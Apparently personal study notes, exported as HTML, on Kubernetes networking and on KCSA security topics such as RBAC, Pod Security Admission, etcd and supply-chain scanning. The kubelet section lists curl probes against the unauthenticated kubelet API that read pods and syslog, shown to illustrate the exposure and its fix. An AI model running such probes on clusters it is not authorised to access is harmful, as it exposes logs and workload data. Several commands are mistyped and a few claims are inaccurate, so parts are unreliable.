<li>admissionregistration.k8s.io: Contains resources like mutating webhooks and validating webhooks.</li>
</ul>
</li>
<li>Example:</li>
</ul>
<pre><code>curl -k https://&lt;master-ip&gt;:6443/apis/apps/v1
</code></pre>
<h2 id="role-based-access-control-rbac"><a class="header" href="#role-based-access-control-rbac">Role Based Access Control (RBAC)</a></h2>
<ul>
<li>Role-based access control (RBAC) is a method of restricting access to resources based on the roles of users or systems.</li>
</ul>
<h2 id="service-accounts-1"><a class="header" href="#service-accounts-1">Service Accounts</a></h2>
<ul>
<li>Service Accounts are created and managed by the Kubernetes API and can be used for machine authentication</li>
<li>To create a service account: <code>kubectl create serviceaccount &lt;account name&gt;</code></li>
<li>Service accounts are namespaced</li>
<li>When a service account is created, it has a token created automatically. The token is stored as a secret object.</li>
<li>You can also use the base64 encoded token to communicate with the Kube API Server:
<code>curl https://172.16.0.1:6443/api -insecure --header "Authorization: Bearer &lt;token value&gt;"</code></li>
<li>You can grant service accounts permission to the cluster itself by binding it to a role with a rolebinding. If a pod needs access to the cluster where it is hosted, you you configure the automountServiceAccountToken boolean parameter on the pod and assign it a service account that has the appropriate permissions to the cluster. The token will be mounted to the pods file system, where the value can then be accessed by the pod. The secret is mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
<li>A service account named ‚Äòdefault‚Äô is automatically created in every namespace</li>
<li>As of kubernetes 1.22, tokens are automatically mounted to pods by an admission controller as a projected volume.
<ul>
<li>https://github.com/kubernetes/enhancements/blob/master/keps/sig-auth/1205-bound-service-account-tokens/README.md</li>
</ul>
</li>
<li>As of Kubernetes 1.24, when you create a service account, a secret is no longer created automatically for the token. Now you must run <code>kubectl create token &lt;service account name&gt;</code> to create the token.
<ul>
<li>https://github.com/kubernetes/enhancements/issues/2799</li>
</ul>
</li>
</ul>
<h1 id="container-orchestration"><a class="header" href="#container-orchestration">Container Orchestration</a></h1>
<h2 id="cluster-networking"><a class="header" href="#cluster-networking">Cluster Networking</a></h2>
<ul>
<li>A kubernetes cluster consists of master and worker nodes. Each node must have a network interface with a valid IP address configured. Each host must be connected to a network.</li>
<li>Certain TCP/UDP ports are required to be open:
<ul>
<li>6443/tcp</li>
<li>10250/tcp</li>
<li>10251/tcp</li>
<li>10252/tcp</li>
<li>2379/tcp</li>
<li>2380/tcp</li>
<li>30000-32767/tcp</li>
</ul>
</li>
</ul>
<h2 id="pod-networking"><a class="header" href="#pod-networking">Pod Networking</a></h2>
<ul>
<li>Every requires an IP address</li>
<li>Every pod in the cluster should be able to reach every other pod without using NAT</li>
</ul>
<h2 id="cni"><a class="header" href="#cni">CNI</a></h2>
<ul>
<li>Container Network Interface</li>
<li>Container Network Interface (CNI) is a framework for dynamically configuring networking resources. It uses a group of libraries and specifications written in Go. The plugin specification defines an interface for configuring the network, provisioning IP addresses, and maintaining connectivity with multiple hosts.</li>
</ul>
<h2 id="dns-1"><a class="header" href="#dns-1">DNS</a></h2>
<ul>
<li>Domain Name Service</li>
<li>Used to resolve names to IP addresses</li>
<li>CoreDNS is the default DNS service used in Kubernetes</li>
</ul>
<h2 id="ingress"><a class="header" href="#ingress">Ingress</a></h2>
<ul>
<li></li>
</ul>
<h2 id="services"><a class="header" href="#services">Services</a></h2>
<ul>
<li>Services are like a load balancer. They load balance traffic to backend pods (referred to as endpoints)</li>
<li>There are 3 types of services in Kubernetes
<ul>
<li>ClusterIP
<ul>
<li>the default</li>
<li>The service IP address is only available inside the cluster</li>
</ul>
</li>
<li>NodePort
<ul>
<li>Makes the service accessible on a predefined port on all nodes in the cluster</li>
</ul>
</li>
<li>LoadBalancer
<ul>
<li>Provisions a load balancer in a cloud environment to make the service accessible</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="sidecars"><a class="header" href="#sidecars">Sidecars</a></h2>
<ul>
<li>Sidecars are a secondary container running inside our pod that provide a service for the primary pod</li>
<li>An example is a container in our pod that ships logs to an external service for the business-logic container</li>
</ul>
<h2 id="envoy"><a class="header" href="#envoy">Envoy</a></h2>
<ul>
<li></li>
</ul>
<h2 id="storage"><a class="header" href="#storage">Storage</a></h2>
<ul>
<li></li>
</ul>
<h1 id="cloud-native-architecture"><a class="header" href="#cloud-native-architecture">Cloud Native Architecture</a></h1>
<h2 id="autoscaling"><a class="header" href="#autoscaling">Autoscaling</a></h2>
<ul>
<li>Horizontal Pod Autoscaler (HPA)
<ul>
<li>Automatically scales the number of pods in a deployment based on CPU utilization or custom metrics</li>
</ul>
</li>
<li>Vertical Pod Autoscaler (VPA)
<ul>
<li>Automatically adjusts the CPU and memory requests and limits for a pod based on its usage</li>
</ul>
</li>
<li>Cluster Autoscaler
<ul>
<li>Automatically adjusts the number of nodes in a cluster based on resource demands</li>
</ul>
</li>
</ul>
<h2 id="kubernetes-keps-and-sigs"><a class="header" href="#kubernetes-keps-and-sigs">Kubernetes KEPs and SIGs</a></h2>
<ul>
<li>Kubernetes Enhancement Proposals (KEPs) are used to propose and track major changes to Kubernetes</li>
<li>Special Interest Groups (SIGs) are used to organize contributors around specific areas of the project</li>
</ul>
<h1 id="cloud-native-application-delivery"><a class="header" href="#cloud-native-application-delivery">Cloud Native Application Delivery</a></h1>
<h2 id="gitops"><a class="header" href="#gitops">GitOps</a></h2>
<ul>
<li>
<h2 id="what-is-gitops"><a class="header" href="#what-is-gitops">What is GitOps</a></h2>
</li>
<li>GitOps Principles
<ul>
<li>Declarative - The entire system must be described desclaritively</li>
<li>Versioned/Immutable -</li>
<li>Pulled Automatically - Changes must be applied automatically</li>
<li>Continuously Reconciled - Monitor desired state vs. actual state and reconcile if needed</li>
</ul>
</li>
</ul>
<h1 id="observability"><a class="header" href="#observability">Observability</a></h1>
<h2 id="prometheus"><a class="header" href="#prometheus">Prometheus</a></h2>
<ul>
<li>Prometheus is an open-source monitoring and alerting system</li>
<li>Prometheus scrapes metrics from instrumented jobs and stores them in a time-series database</li>
<li>Prometheus provides a query language (PromQL) to query and visualize the collected metrics</li>
<li>Prometheus can be integrated with Grafana for visualization</li>
<li>Prometheus can be used to monitor Kubernetes clusters and applications running on Kubernetes</li>
<li>Prometheus is designed to collect numeric database, not logs.</li>
<li>Exporters run on the nodes and expose metrics to Prometheus</li>
<li>Prometheus scrapes the metrics from the exporters</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
<h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory Map</a></h2>
<ul>
<li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-certified-security-associate-kcsa-notes"><a class="header" href="#kubernetes-certified-security-associate-kcsa-notes">Kubernetes Certified Security Associate (KCSA) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/kcsa/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/kcsa/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/kcsa/">https://www.cncf.io/certification/kcsa/</a>
<h1 align="center">Kubernetes Certified Security Associate (KCSA) Notes</h1>

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList= alse} -->
<h1 id="table-of-contents-9"><a class="header" href="#table-of-contents-9">Table of Contents</a></h1>
<ul>
<li><a href="#exam-2">Exam</a>
<ul>
<li><a href="#outline-2">Outline</a></li>
<li><a href="#changes-2">Changes</a></li>
</ul>
</li>
<li><a href="#preparation-2">Preparation</a>
<ul>
<li><a href="#study-resources-2">Study Resources</a></li>
<li><a href="#practice-2">Practice</a></li>
</ul>
</li>
<li><a href="#introduction-29">Introduction</a></li>
<li><a href="#overview-of-cloud-native-security">Overview of Cloud Native Security</a>
<ul>
<li><a href="#4cs-of-cloud-native-security">4Cs of Cloud Native Security</a></li>
<li><a href="#cluster-security">Cluster Security</a></li>
<li><a href="#pod-security">Pod Security</a></li>
<li><a href="#code-security">Code Security</a></li>
<li><a href="#kubernetes-threat-models">Kubernetes Threat Models</a>
<ul>
<li><a href="#attack-vectors">Attack Vectors</a></li>
<li><a href="#mitigations">Mitigations</a></li>
</ul>
</li>
<li><a href="#platform-security">Platform Security</a>
<ul>
<li><a href="#supply-chain-security">Supply Chain Security</a></li>
<li><a href="#artifact-and-image-security">Artifact and Image Security</a></li>
<li><a href="#policy-enforcement">Policy Enforcement</a></li>
</ul>
</li>
<li><a href="#compliance-frameworks">Compliance Frameworks</a>
<ul>
<li><a href="#gdpr">GDPR</a></li>
<li><a href="#hipaa">HIPAA</a></li>
<li><a href="#pci-dss">PCI DSS</a></li>
<li><a href="#cis-benchmarks">CIS Benchmarks</a></li>
</ul>
</li>
<li><a href="#threat-modeling">Threat Modeling</a>
<ul>
<li><a href="#stride-framework">STRIDE Framework</a></li>
<li><a href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></li>
</ul>
</li>
<li><a href="#observability-and-incident-response">Observability and Incident Response</a>
<ul>
<li><a href="#monitoring-and-logging">Monitoring and Logging</a></li>
<li><a href="#incident-investigation-tools">Incident Investigation Tools</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-cluster-component-security">Kubernetes Cluster Component Security</a>
<ul>
<li><a href="#kube-api-server">Kube-api Server</a></li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam-2"><a class="header" href="#exam-2">Exam</a></h1>
<h2 id="outline-2"><a class="header" href="#outline-2">Outline</a></h2>
<ul>
<li><strong>Exam Duration:</strong> 2 hours</li>
<li><strong>Number of Questions:</strong> 50</li>
<li><strong>Question Format:</strong> Multiple choice</li>
<li><strong>Passing Score:</strong> 66%</li>
<li><strong>Exam Cost:</strong> $300</li>
</ul>
<h2 id="changes-2"><a class="header" href="#changes-2">Changes</a></h2>
<ul>
<li></li>
</ul>
<hr>
<h1 id="preparation-2"><a class="header" href="#preparation-2">Preparation</a></h1>
<h2 id="study-resources-2"><a class="header" href="#study-resources-2">Study Resources</a></h2>
<ul>
<li><strong>Kubernetes Documentation:</strong> <a href="https://kubernetes.io/docs/">https://kubernetes.io/docs/</a></li>
</ul>
<h2 id="practice-2"><a class="header" href="#practice-2">Practice</a></h2>
<ul>
<li></li>
</ul>
<h1 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h1>
<p>The Kubernetes and Cloud Native Security Associate (KCSA) certification prepares individuals to secure Kubernetes environments and address modern cloud-native security challenges. This document consolidates core concepts, threat models, compliance standards, and best practices.</p>
<hr>
<h1 id="overview-of-cloud-native-security"><a class="header" href="#overview-of-cloud-native-security">Overview of Cloud Native Security</a></h1>
<h2 id="4cs-of-cloud-native-security"><a class="header" href="#4cs-of-cloud-native-security">4Cs of Cloud Native Security</a></h2>
<ol>
<li><strong>Code:</strong> Secure development practices (e.g., avoid hardcoding secrets).</li>
<li><strong>Container:</strong> Prevent privilege escalation, use minimal base images.</li>
<li><strong>Cluster:</strong> Restrict API server access, encrypt etcd data.</li>
<li><strong>Cloud:</strong> Use cloud-native tools for monitoring and securing infrastructure.</li>
</ol>
<h2 id="cluster-security"><a class="header" href="#cluster-security">Cluster Security</a></h2>
<ul>
<li>Harden the Kubernetes API server with role-based access control (RBAC).</li>
<li>Disable anonymous authentication for kubelet communication.</li>
</ul>
<h2 id="pod-security"><a class="header" href="#pod-security">Pod Security</a></h2>
<ul>
<li>Use Pod Security Admission (PSA) to enforce best practices (e.g., no root users).</li>
<li>Isolate sensitive workloads using namespaces and network policies.</li>
</ul>
<h2 id="code-security"><a class="header" href="#code-security">Code Security</a></h2>
<ul>
<li>Use static code analysis tools like SonarQube or Codacy.</li>
<li>Store secrets securely using Kubernetes Secrets.</li>
</ul>
<h2 id="kubernetes-threat-models"><a class="header" href="#kubernetes-threat-models">Kubernetes Threat Models</a></h2>
<h3 id="attack-vectors"><a class="header" href="#attack-vectors">Attack Vectors</a></h3>
<ul>
<li><strong>Privilege Escalation:</strong> Exploiting weak RBAC configurations.</li>
<li><strong>Unauthorized Access:</strong> Using misconfigured service accounts.</li>
<li><strong>Data Theft:</strong> Exploiting unencrypted volumes or exposed secrets.</li>
</ul>
<h3 id="mitigations"><a class="header" href="#mitigations">Mitigations</a></h3>
<ul>
<li>Apply principle of least privilege with RBAC.</li>
<li>Use encryption for both data at rest and in transit.</li>
<li>Regularly scan images for vulnerabilities.</li>
</ul>
<h2 id="platform-security"><a class="header" href="#platform-security">Platform Security</a></h2>
<h3 id="supply-chain-security"><a class="header" href="#supply-chain-security">Supply Chain Security</a></h3>
<ul>
<li>Use SBOMs (Software Bill of Materials) to track dependencies.</li>
<li>Sign container images using tools like Cosign.</li>
</ul>
<h3 id="artifact-and-image-security"><a class="header" href="#artifact-and-image-security">Artifact and Image Security</a></h3>
<ul>
<li>Enforce vulnerability scanning with tools like Trivy or Clair.</li>
<li>Ensure images come from trusted registries.</li>
</ul>
<h3 id="policy-enforcement"><a class="header" href="#policy-enforcement">Policy Enforcement</a></h3>
<ul>
<li>Use tools like Kyverno and OPA Gatekeeper to validate deployments.</li>
<li>Enforce policies for image signatures, namespace isolation, and resource quotas.</li>
</ul>
<h2 id="compliance-frameworks"><a class="header" href="#compliance-frameworks">Compliance Frameworks</a></h2>
<h3 id="gdpr"><a class="header" href="#gdpr">GDPR</a></h3>
<ul>
<li>Encrypt sensitive user data in transit and at rest.</li>
<li>Implement RBAC to restrict access to personal data.</li>
</ul>
<h3 id="hipaa"><a class="header" href="#hipaa">HIPAA</a></h3>
<ul>
<li>Ensure secure handling of healthcare information using TLS and encrypted storage.</li>
<li>Log and monitor access to healthcare data.</li>
</ul>
<h3 id="pci-dss"><a class="header" href="#pci-dss">PCI DSS</a></h3>
<ul>
<li>Segment payment data workloads with network policies.</li>
<li>Regularly audit access controls and encryption compliance.</li>
</ul>
<h3 id="cis-benchmarks"><a class="header" href="#cis-benchmarks">CIS Benchmarks</a></h3>
<ul>
<li>Use kube-bench to check Kubernetes against CIS recommendations.</li>
<li>Ensure secure API server and etcd configurations.</li>
</ul>
<h2 id="threat-modeling"><a class="header" href="#threat-modeling">Threat Modeling</a></h2>
<h3 id="stride-framework"><a class="header" href="#stride-framework">STRIDE Framework</a></h3>
<ul>
<li><strong>Spoofing:</strong> Prevent by enforcing strong authentication (e.g., mTLS).</li>
<li><strong>Tampering:</strong> Ensure data integrity with digital signatures.</li>
<li><strong>Information Disclosure:</strong> Encrypt all sensitive data.</li>
<li><strong>Denial of Service:</strong> Use resource quotas and rate limits.</li>
</ul>
<h3 id="mitre-attck-framework"><a class="header" href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></h3>
<ul>
<li>Focuses on real-world attack scenarios.</li>
<li>Categories include Initial Access, Persistence, Privilege Escalation, and Defense Evasion.</li>
</ul>
<h2 id="observability-and-incident-response"><a class="header" href="#observability-and-incident-response">Observability and Incident Response</a></h2>
<h3 id="monitoring-and-logging"><a class="header" href="#monitoring-and-logging">Monitoring and Logging</a></h3>
<ul>
<li>Use <strong>Prometheus</strong> for metrics collection and alerting.</li>
<li>Use <strong>Fluentd</strong> or <strong>Elasticsearch</strong> for log aggregation and search.</li>
</ul>
<h3 id="incident-investigation-tools"><a class="header" href="#incident-investigation-tools">Incident Investigation Tools</a></h3>
<ul>
<li>Use <strong>Falco</strong> for runtime security alerts.</li>
<li>Use <strong>Zeek</strong> and <strong>Snort</strong> for network intrusion detection.</li>
</ul>
<hr>
<h1 id="kubernetes-cluster-component-security"><a class="header" href="#kubernetes-cluster-component-security">Kubernetes Cluster Component Security</a></h1>
<ul>
<li>Use TLS to ensure all traffic between cluster control-plane components is encrypted</li>
</ul>
<h2 id="kube-api-server"><a class="header" href="#kube-api-server">Kube-API Server</a></h2>
<ul>
<li>Kube-API server is at the center of all operations in a Kubernetes cluster</li>
<li>In regards to security, we need to make 2 decisions, who can access the cluster, and what can they do?
<ul>
<li>Certificates</li>
<li>LDAP</li>
<li>Service Accounts</li>
</ul>
</li>
<li>Once they gain access to the cluster, what they can do is defined by authorization mechanisms:
<ul>
<li>RBAC</li>
<li>ABAC</li>
</ul>
</li>
</ul>
<h2 id="controller-manager-and-scheduler"><a class="header" href="#controller-manager-and-scheduler">Controller Manager and Scheduler</a></h2>
<ul>
<li>Controller manager ensures nodes are healthy, manages pods and controllers, etc.</li>
<li>The scheduler determines where (on which nodes) the pods can run on in a cluster</li>
<li>To protect either of these components, you need to isolate them.</li>
</ul>
<h2 id="kubelet"><a class="header" href="#kubelet">Kubelet</a></h2>
<ul>
<li>Kubelet runs on the worker nodes and manages the node</li>
<li>Kubelet registers the node with the control-plane</li>
<li>Kubelet listens on 2 ports:
<ul>
<li>10250: Serves API that allows full access</li>
<li>10255: Serves API that allows unauthenticated, read-only access</li>
</ul>
</li>
<li>By default, kubelet allows anonymous access to it‚Äôs API.
<ul>
<li><code>curl -sk https://nodename:10250/pods/</code></li>
<li><code>curl -sk https://nodename:10250/logs/syslog/</code></li>
<li><code>curl -sk https://nodename:10255/metrics/</code></li>
<li>This can be disabled by setting <code>anonymous-auth=false</code> in the kubelet config</li>
<li>Kubelet supports 2 types of authentication, bearer token and certificate-based</li>
</ul>
</li>
</ul>
<h2 id="security-the-container-runtime"><a class="header" href="#security-the-container-runtime">Security the Container Runtime</a></h2>
<ul>
<li>The container runtime is responsible for running the containers</li>
<li>CRI (Container Runtime Interface) allows Kubernetes to use any container runtime that is compliant with CRI</li>
<li>The most common container runtime is Docker, but others include containerd, cri-o, etc.</li>
<li>You should configure pods and containers to run with least privileges by configuring the security context</li>
<li>You should also scan the images for vulnerabilities before deploying them</li>
</ul>
<h2 id="securing-kubeproxy"><a class="header" href="#securing-kubeproxy">Securing KubeProxy</a></h2>
<ul>
<li>KubeProxy is responsible for managing the network in a Kubernetes cluster</li>
<li>Ensure that proper permissions are set on the kube-proxy config file
<pre><code>&gt; px aux |grep -i kube-proxy |grep -i config - This will show the kube-proxy process and the config file it is using
&gt; ls -l /var/lib/kube-proxy/kube-config.conf - This will show the permissions on the kube-proxy config file
</code></pre>
</li>
</ul>
<h2 id="pod-security-1"><a class="header" href="#pod-security-1">Pod Security</a></h2>
<h3 id="pod-security-admission-1"><a class="header" href="#pod-security-admission-1">Pod Security Admission</a></h3>
<ul>
<li>Pod Security Policies (PSP) are deprecated in Kubernetes 1.21</li>
<li>Pod Security Admission (PSA) is the new way to enforce security policies on pods</li>
<li>PSA is a webhook that intercepts pod creation requests and validates them against a set of policies</li>
</ul>
<h2 id="securing-etcd-1"><a class="header" href="#securing-etcd-1">Securing etcd</a></h2>
<ul>
<li>etcd is a distributed key-value store that stores the state of the cluster</li>
<li>etcd is a critical component of the cluster and should be secured</li>
<li>etcd should be configured to use TLS for encryption. To encrypt the database, you can create a <code>EncryptionConfiguration</code> object and pass it to the etcd pod</li>
</ul>
<h1 id="kubernetes-security-fundamentals"><a class="header" href="#kubernetes-security-fundamentals">Kubernetes Security Fundamentals</a></h1>
<h2 id="pod-security-admission-1-1"><a class="header" href="#pod-security-admission-1-1">Pod Security Admission</a></h2>
<ul>
<li>Replaces pod security standards</li>
<li>Meant to be safe and easy to use.</li>
<li>Enabled by default. Runs as an admission controller.</li>
<li>Applied to namespaces. To apply to a namespace, simply add a label:
<pre><code>kubectl label ns &lt;namespace&gt; pod-security.kubernetes.io/&lt;mode&gt;=&lt;security standard&gt;
</code></pre>
<ul>
<li>
<p>Modes:</p>
<ul>
<li>What action to take if a pod violates the policy</li>
<li>The modes are: enforce, audit, warn</li>
</ul>
</li>
<li>
<p>Standards:</p>
<ul>
<li>These are built-in policies</li>
<li>They are: Privileged, baseline, and restricted</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h2>
<ul>
<li>Kubernetes does not manage user accounts itself. It depends on an external service to do that.</li>
<li>All authentication is managed by the kube-api server</li>
<li>Kube-api server authenticates users via certificates, tokens, or an external service such as LDAP or Kerberos</li>
</ul>
<h2 id="authorization-2"><a class="header" href="#authorization-2">Authorization</a></h2>
<ul>
<li>Once someone or something is authenticated, what are they able to do? This is authorization.</li>
<li>There are 6 different authorization modes in Kubernetes:
<ul>
<li>Node</li>
<li>ABAC</li>
<li>RBAC</li>
<li>Webhook</li>
<li>AlwaysAllow (the default)</li>
<li>AlwaysDeny</li>
</ul>
</li>
<li>Authorization mode can be configured on the kube-api server using the <code>--authorization-mode</code> flag</li>
</ul>
<h3 id="rbac"><a class="header" href="#rbac">RBAC</a></h3>
<ul>
<li></li>
<li>Role, ClusterRole, RoleBinding ClusterRoleBinding</li>
</ul>
<h2 id="secrets"><a class="header" href="#secrets">Secrets</a></h2>
<ul>
<li>Secrets are used to store sensitive information</li>
<li>They are similar in concept to <code>ConfigMaps</code></li>
<li>Secrets are not encrypted, they are base64 encoded</li>
<li>Secrets are only loaded on nodes where they are needed.</li>
</ul>
<h2 id="namespaces"><a class="header" href="#namespaces">Namespaces</a></h2>
<ul>
<li>Namespaces can be used to isolate or organize resources in a Kubernetes cluster</li>
<li>RBAC can be applied to namespaces for authorization</li>
<li></li>
</ul>
<h2 id="resource-quotas-and-limits"><a class="header" href="#resource-quotas-and-limits">Resource Quotas and Limits</a></h2>
<h3 id="resource-requests-and-limits"><a class="header" href="#resource-requests-and-limits">Resource Requests and Limits</a></h3>
<h3 id="resource-quotas-1"><a class="header" href="#resource-quotas-1">Resource Quotas</a></h3>
<ul>
<li>Set a hard limit for resource requests and quotas defined on a pod</li>
</ul>
<h3 id="limit-ranges"><a class="header" href="#limit-ranges">Limit Ranges</a></h3>
<h2 id="security-context"><a class="header" href="#security-context">Security Context</a></h2>
<ul>
<li>a Security Context gives you the ability to do several things:
<ul>
<li>run the container as a different UID/GID</li>
<li>make the root file system read-only</li>
<li>etc</li>
</ul>
</li>
<li>Some settings can be applied on the pod, and some can be applied on the container</li>
</ul>
<h1 id="kubernetes-threat-model"><a class="header" href="#kubernetes-threat-model">Kubernetes Threat Model</a></h1>
<ul>
<li>Threat modeling helps you identify potential threats, understand their impact, and put measures in place to prevent them</li>
<li>Understand how traffic/data flows in the environment and identity vulnerabilities at each point</li>
</ul>
<h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
<ul>
<li>Once an attacker accesses the environment, the first goal is typically to establishpersistence.</li>
<li>Persistence allows attackers to maintain access to a cluster</li>
</ul>
<h2 id="denial-of-service"><a class="header" href="#denial-of-service">Denial of Service</a></h2>
<ul>
<li>Set resource quotas to prevent excessive resource usage</li>
<li>Restrict service account permissions</li>
<li>Use Network Policies and firewalls to control access</li>
<li>Monitor and alert on unusual activity</li>
</ul>
<h1 id="platform-security-1"><a class="header" href="#platform-security-1">Platform Security</a></h1>
<h2 id="observability-1"><a class="header" href="#observability-1">Observability</a></h2>
<ul>
<li>Falco is a tool that can be used to monitor actions taken on cluster nodes, such as reading/writing files, etc.</li>
</ul>
<h2 id="service-mesh"><a class="header" href="#service-mesh">Service Mesh</a></h2>
<ul>
<li>A service mesh is a dedicated infrastructure layer for handling service-to-service communication</li>
<li>It can handle service discovery, load balancing, encryption, etc.</li>
<li>Istio is a popular service mesh</li>
</ul>
<h3 id="istio"><a class="header" href="#istio">Istio</a></h3>
<ul>
<li>Istio is a service mesh that provides a way to control how microservices share data with each other</li>
<li>Istio works with Kubernetes and traditional workloads</li>
<li>Istio uses a high-performance proxy service called Envoy to manage traffic between services</li>
</ul>
<h2 id="certificates"><a class="header" href="#certificates">Certificates</a></h2>
<h3 id="openssl"><a class="header" href="#openssl">Openssl</a></h3>
<ul>
<li>You can use <code>openssl</code> to generate certificates for the cluster</li>
<li>Generate keys: <code>openssl genrsa -out my.key 2048</code></li>
<li>Create a CSR: <code>openssl req -new -key my.key -sub "/CN=KUBERNETES-CA" -out ca.csr</code></li>
<li>Sign certificates: <code>openss x509 -req -in ca.csr -signkey my.key -out ca.crt</code></li>
</ul>
<h1 id="compliance-and-security-frameworks"><a class="header" href="#compliance-and-security-frameworks">Compliance and Security Frameworks</a></h1>
<h2 id="compliance-frameworks-1"><a class="header" href="#compliance-frameworks-1">Compliance Frameworks</a></h2>
<ul>
<li>Examples: GDPR, HIPAA, NIST, PCI DSS, CIS</li>
</ul>
<h3 id="gdpr-1"><a class="header" href="#gdpr-1">GDPR</a></h3>
<ul>
<li>Introduced by the European Union to protect the data of citizens</li>
</ul>
<h3 id="hipaa-1"><a class="header" href="#hipaa-1">HIPAA</a></h3>
<ul>
<li>A United States regulation used to control the access to health data</li>
</ul>
<h3 id="pci-dss-1"><a class="header" href="#pci-dss-1">PCI DSS</a></h3>
<ul>
<li>Used to protect payment data</li>
</ul>
<h3 id="nist"><a class="header" href="#nist">NIST</a></h3>
<ul>
<li>Created by the United States but recognized globally.</li>
<li>Used to protect compute environments by doing regular security-related audits (pentests, etc.)</li>
</ul>
<h3 id="cis"><a class="header" href="#cis">CIS</a></h3>
<ul>
<li>CIS creates benchmarks for various environments such as operating systems and Kubernetes</li>
</ul>
<h2 id="threat-modeling-frameworks"><a class="header" href="#threat-modeling-frameworks">Threat-Modeling Frameworks</a></h2>
<ul>
<li>Threat-modeling frameworks defined how to achieve the compliance frameworks mentioned above</li>
<li>Two thread-models of interests are STRIDE and MITRE</li>
</ul>
<h3 id="stride"><a class="header" href="#stride">STRIDE</a></h3>
<ul>
<li>Created and maintained by Microsoft</li>
<li>Helps identity 6 categories of threats
<ul>
<li>Spoofing</li>
<li>Tampering</li>
<li>Repudiation</li>
<li>Information Disclosure</li>
<li>Denial of Service</li>
<li>Elevation of Privilege</li>
</ul>
</li>
</ul>
<h3 id="mitre"><a class="header" href="#mitre">MITRE</a></h3>
<ul>
<li>5 categories
<ul>
<li>Initial Access</li>
<li>Execution</li>
<li>Persistence</li>
<li>Privilege Escalation</li>
<li>Defense Evasion</li>
</ul>
</li>
<li>https://microsoft.github.io/Threat-Matrix-for-Kubernetes/</li>
</ul>
<h2 id="supply-chain-compliance"><a class="header" href="#supply-chain-compliance">Supply Chain Compliance</a></h2>
<ul>
<li>Verify all the components (libraries, container images, etc.) that make up your application are secure and meet compliance requirements</li>
<li>Securing the supply chain focuses on 4 main areas:
<ul>
<li>artifacts</li>
<li>metadata</li>
<li>attestations</li>
<li>policies</li>
</ul>
</li>
</ul>
<h3 id="reduce-docker-image-size-1"><a class="header" href="#reduce-docker-image-size-1">Reduce docker image size</a></h3>
<ul>
<li>
<p>Smaller images are faster to download and deploy</p>
</li>
<li>
<p>Smaller images are more secure</p>
</li>
<li>
<p>Smaller images are easier to manage</p>
</li>
<li>
<p>To reduce the size of a docker image:</p>
<ul>
<li>Use a smaller base image</li>
<li>Use specific package/image versions</li>
<li>Make file-system read-only</li>
<li>Don‚Äôt run the container as root</li>
<li>Use multi-stage builds</li>
<li>Remove unnecessary files</li>
<li>Use a <code>.dockerignore</code> file to exclude files and directories from the image</li>
<li>Use <code>COPY</code> instead of <code>ADD</code></li>
<li>Use <code>alpine</code> images</li>
<li>Use <code>scratch</code> images</li>
<li>Use <code>distroless</code> images</li>
</ul>
</li>
<li>
<p>Example of a multi-stage build:</p>
<pre><code># build container stage 1
  FROM ubuntu
  ARG DEBIAN_FRONTEND=noninteractive
  RUN apt-get update &amp;&amp; apt-get install -y golang-go
  COPY app.go .
  RUN CGO_ENABLED=0 go build app.go

# app container stage 2
  FROM alpine:3.12.1 # it is better to use a defined tag, rather than 'latest'
  RUN addgroup -S appgroup &amp;&amp; adduser -S appuser -G appgroup -h /home/appuser
  COPY --from=0 /app /home/appuser/app
  USER appuser # run as a non-root user
  CMD ["/home/appuser/app"]
</code></pre>
</li>
<li>
<p>Dockerfile best practices: https://docs.docker.com/build/building/best-practices/</p>
</li>
<li>
<p>Only certain docker directives create new layers in an image</p>
<ul>
<li><code>FROM</code></li>
<li><code>COPY</code></li>
<li><code>CMD</code></li>
<li><code>RUN</code></li>
</ul>
</li>
<li>
<p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
</li>
</ul>
<h3 id="static-analysis-1"><a class="header" href="#static-analysis-1">Static Analysis</a></h3>
<h4 id="sbom-2"><a class="header" href="#sbom-2">SBOM</a></h4>
<ul>
<li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
<li>Formats
<ul>
<li>SPDX
<ul>
<li>The standard format for sharing SBOM</li>
<li>Available in JSON, RDF, and tag/value formats</li>
<li>More complex than CycloneDX due to it‚Äôs extensive metadata coverage</li>
<li>Comprehensive metadata including license information, origin, and file details</li>
</ul>
</li>
<li>CycloneDX
<ul>
<li>A lightweight format focused on security and compliance</li>
<li>Available in JSON and XML formats</li>
<li>Simpler and more focused on essential SBOM elements</li>
<li>Focuses on component details, vulnerabilities, and dependencies</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="kubesec-1"><a class="header" href="#kubesec-1">Kubesec</a></h4>
<ul>
<li>Used for static analysis of manifests</li>
<li>https://github.com/controlplaneio/kubesec</li>
</ul>
<h4 id="syft-1"><a class="header" href="#syft-1">Syft</a></h4>
<ul>
<li>Syft is a powerful and easy-to-use open-source tool for generating Software Bill of Materials (SBOMs) for container images and filesystems. It provides detailed visibility into the packages and dependencies in your software, helping you manage vulnerabilities, license compliance, and software supply chain security.</li>
<li>Syft can export results in SPDX, CycloneDX, JSON, etc.</li>
<li>To scan an image with syft and export the results to a file in SPDX format:
<pre><code>syft scan docker.io/kodekloud/webapp-color:latest -o spdx --file /root/webapp-spdx.sbom
</code></pre>
</li>
</ul>
<h4 id="grype-1"><a class="header" href="#grype-1">Grype</a></h4>
<ul>
<li>Grype is a tool (also from Anchore) that can be used to scan SBOM for vulnerabilities</li>
<li>To scan a SBOM with Grype:
